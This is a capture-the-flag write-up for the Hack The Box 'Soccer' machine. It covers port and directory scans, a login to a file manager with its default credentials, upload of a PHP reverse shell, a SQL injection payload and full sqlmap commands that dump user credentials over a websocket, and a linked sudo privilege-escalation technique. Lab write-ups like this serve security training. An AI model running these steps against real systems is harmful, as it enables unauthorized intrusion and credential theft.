# Soccer

![image](https://user-images.githubusercontent.com/56447720/246658256-c8584b26-26e2-4111-8ce1-22143c954490.png)

## Port scan results

```bash
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http            syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Soccer - Index
9091/tcp open  xmltec-xmlmail? syn-ack
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 18 Jun 2023 10:23:57 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 18 Jun 2023 10:23:57 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 18 Jun 2023 10:23:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94%I=7%D=6/18%Time=648EDB37%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op

<-- REDACTED -->

SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Directory scan

```bash
$ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlist/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlist/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 16:12:32 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 20456 / 20477 (99.90%)
===============================================================
2023/06/18 16:19:07 Finished
===============================================================

```

### **/tiny**

* Found a web hosted file manager

![image](https://user-images.githubusercontent.com/56447720/246658641-f3bcc963-4bd4-4a9a-bd33-d644c984deab.png)

* h3k file manager (Github) - https://github.com/prasathmani/tinyfilemanager
* Found default credentials - `admin:admin@123`

### **Shell**

* Homepage

![image](https://user-images.githubusercontent.com/56447720/246671925-1aa1b262-bc1c-4ac4-80b0-82ba2325f9a5.png)

* Uploading a php revshell script into `/tiny/uploads/`
* Revshell : https://github.com/pentestmonkey/php-reverse-shell

![image](https://user-images.githubusercontent.com/56447720/246671909-79aac026-9aad-44ca-8b89-011ff2380ae8.png)

* And we got the shell

![image](https://user-images.githubusercontent.com/56447720/246672017-77425cf0-10f4-4cc4-838e-45dddd8e5e54.png)

**new subdomain**

```bash
www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb

www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
www-data@soccer:/etc/nginx/sites-enabled$
```

* Adding `soc-player.soccer.htb` in our hosts file

#### Exploiting web sockets with sqlmap

* Create a account here : http://soc-player.soccer.htb/signup
* After the login the homepage contains a field where tickets are checked if exists or not

![image](https://user-images.githubusercontent.com/56447720/246672260-7da2affe-2772-4f84-9b51-49988a7914b7.png)

* It is vulnerable to SQLi, payload : `1234 OR 1=1`

**SQLmap:**

* Payload : `sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch --level 5 --risk 3 --dbs --threads 10`
* Breadkdown :
  * `sqlmap` : tool we used to automate exploitation of sql injection
  * `-u 'ws://soc-player.soccer.htb:9091/'` : here we set url with -u
  * `--data '{"id":"*"}'` : data that we going to use/ data that websockets is using, the `*` specifies sqlmap to insert all of it's payload there.
  * `--batch` : to automate Y/N, if we don't ues this then we have an interactive session with sqlmap.
  * `--level` : to set the level of how aggressive our attack should be (1 is low, 5 is the highest)
  * `--risk` : to set the risk of the attack (1 is the lowest, 3 is the highest)
  * `--dbs` : to get databases from the server
  * `--threads` : to increase the speed of the attack
* FINAL PAYLOAD : `sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch --level 5 --risk 3 --dump -T <--REDACTED--> -D <--REDACTED--> --threads 10`
* We got credentials for account `player`

```
+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | <--REDACTED-->       |
+------+-------------------+----------+----------------------+
```

## User shell

![image](https://user-images.githubusercontent.com/56447720/246674253-10a4142c-2da8-47b7-ae22-296b552de4c8.png)

## Root Shell

* Follow the steps here :&#x20;

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#exploitation" %}

![image](https://user-images.githubusercontent.com/56447720/246676239-e2fa800f-6280-46ae-873c-dbed6ae528de.png)

